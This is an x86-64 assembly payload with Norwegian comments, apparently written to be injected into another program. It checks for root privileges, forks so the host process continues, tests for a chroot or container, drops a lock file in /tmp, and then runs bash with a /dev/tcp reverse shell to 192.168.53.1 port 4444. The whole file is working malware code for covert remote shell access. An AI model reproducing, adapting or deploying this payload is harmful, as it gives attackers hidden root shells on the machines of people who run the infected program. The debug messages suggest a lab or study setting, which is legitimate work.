		BITS 64
		[SECTION .text]
		global _start
_start:
		; Prologue 
		push	rsi
		push	rdi
		push	rbp 
		mov 	rbp,rsp

		; Her starter selve payloaden

		; Sjekker om geteuid == 0, ellers returnerer den
		mov 	rax, 107 ; geteuid
		syscall
		test 	rax, rax ; sjekker om den er 0
		jne 	_exit ; _exit (relativ)
		
		; Lager en ny prosess, og lar den gamle fortsette
		mov 	rax, 57 ; fork
		syscall
		test 	rax, rax
		jne 	_exit ; den opprinellige prosessen går til _exit og fortsetter som vanlig

		; Gjør et syscall som vil feile hvis prosessen er i en container
		mov 	rax, 161 ; chroot
		call 	_customdata2 ; rdi = *"/"
		syscall
		test	rax, rax
		jne		_kill


		; Sjekker om fil-"låsen" er til stedet
		mov		rax, 21 ; access
		call _lockPath ; '/tmp/.xLocked_
		mov		rsi, 0 ; F_OK
		syscall
		test	rax, rax
		je		_kill ; hopper til _kill hvis filen eksisterer


		; Sjekker om ppid = 0
		mov		rax, 110 ; getppid
		syscall
		test	rax, rax
		je		_spawnshell

		; Sjekker om ppid = 1
		mov		rax, 110 ; getppid
		syscall
		mov		rbx, 1
		cmp		rax, rbx
		je		_spawnshell

		jmp _kill
_spawnshell:
		; Opretter en fil-"lås"
		mov		rax, 2 ; open
		call _lockPath ; '/tmp/.xLocked_
		mov		rsi, 100 ; O_CREAT
		syscall
		mov 	rbx, 0
		cmp		rbx, rax
		jge		_kill ; Hopper til _kill hvis den ikke klarte å åpne filen
		mov		rdi, rax
		mov		rax, 3 ; close
		syscall

		; [DEBUG] skriver at en revshell startes
		sub		rsp, 0x30
		mov     rax, 0x1 ;write
		mov     rdi, 1
		call _customdata1
		mov     rdx, 20
		syscall

		; Lager et reverse shell
		mov		rax, 59 ; execve
		call	_bashRevShell
		syscall ; execve("/bin/bash",["/bin/bash","-c","`/bin/bash -i 5<> /dev/tcp/127.0.0.1/4444 0<&5 1>&5 2>&5`,0",[0]])


		; Exit
		jmp		_kill; _exit (relativ)
_customdata1:
		lea rsi, [rel $ + 8]
		ret
		dd 'Revshell starting...'
		dd 00
_customdata2:
		lea rdi, [rel $ + 8]
		ret
		dd '/'
		dd 00
_lockPath:
		lea rdi, [rel $ + 8]
		ret
		dd '/tmp/.xLocked_'
		dd 00
_bashRevShell:
		mov		rbx, 0
		push	rbx
		mov		rdx, rsp ; rdx = [0]
		call	_bashArg3
		push	rbx
		call	_bashArg2
		push	rbx
		call	_bashArg1
		push	rdi
		mov		rsi, rsp
		add		rsp, 0x20
		ret

_bashArg1:
		lea rdi, [rel $ + 8]
		ret
		dd '/bin/bash'
		dd 00
_bashArg2:
		lea rbx, [rel $ + 8]
		ret
		dd '-c'
		dd 00
_bashArg3:
		lea rbx, [rel $ + 8]
		ret
		dd '/bin/bash -i 5<> /dev/tcp/192.168.53.1/4444 0<&5 1>&5 2>&5'
		dd 00
_kill:
		mov		rax, 60 ; exit
		mov		rdi, 0 ; exit code
		syscall
		ret
_exit:
		; Her gjennopprettes tilstanden som var før payloaden
		mov 	rsp, rbp
		pop		rbp
		pop 	rdi
		pop 	rsi

		; Dette er bare med for development, sånn at vi ikke får segfault
		mov    eax, 0xe4 ; sys_gettime (?)
		syscall
		ret

; Revshell: /bin/bash -i 5<> /dev/tcp/127.0.0.1/4444 0<&5 1>&5 2>&5
